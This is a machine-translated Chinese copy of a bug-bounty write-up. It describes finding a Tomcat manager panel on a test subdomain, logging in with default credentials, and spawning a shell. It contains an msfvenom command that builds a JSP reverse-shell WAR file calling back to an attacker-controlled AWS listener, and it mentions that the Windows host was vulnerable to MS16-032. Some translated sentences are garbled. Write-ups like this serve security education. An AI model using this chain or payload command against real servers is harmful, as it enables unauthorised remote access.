# 从 TOMCAT 到 NT 权威\系统

> 原文：<https://infosecwriteups.com/from-tomcat-to-nt-authority-system-a79fa09c4abb?source=collection_archive---------0----------------------->

由于工作繁忙，我已经有一段时间没有给虫子发奖金了。

由于隐私问题，我不会透露该计划…

![](img/ece5f744127601d5b4417c8dcef0fd87.png)

我开始了我的初步侦察，用 KNOCKPY 子列表等做了一些子域枚举..

我得到了一个名为***【test.REDACTED.com】***的子域，没什么好找的，它返回了一个简单的静态 HTML 页面，然后我用 Dirsearch 做了一个目录扫描

![](img/6d33c2d84af730f1ee7e2f69311f66f6.png)![](img/062ff7c3375c181c5dfe087873d5526f.png)

**"/经理"**那是一个 TOMCAT 登录

![](img/020f7b7032e62c511a0ea6370750b411.png)

检查它是否使用默认登录更加令人满意

![](img/6dfbf70d8eb378bff728fe10310c82d0.png)

请不要质疑我的电脑名称

还有鼓……..

![](img/17077bcf80f9f647c2623f550afb62d3.png)

我们有一个登录

![](img/5cd5f8115ba09dea52bf31c769a6f69b.png)

呜哇

现在是打开外壳的时候了，我使用 AWS 服务器作为监听器

使用以下命令可以生成 jsp 有效负载

## MSF venom-p Java/JSP _ shell _ reverse _ TCP LHOST = 18.191 . 1 * *。* LPORT=4444 -f war > shell.war

** *您可以通过将自定义端口添加到入站规则部分来打开它***

现在有了 TCP 处理程序

![](img/31343253a31f7c25c33b866e73139232.png)

服务器正在运行 Apache 7.0

在进一步的列举中，我发现服务器是 Microsoft Windows Server 2012，它没有被经常关注，最后一个补丁是在 2016 年(可怜的家伙)

它容易受到 MS16–032 的攻击，我从未试图利用它，因为它可能会激怒一些 DEVS。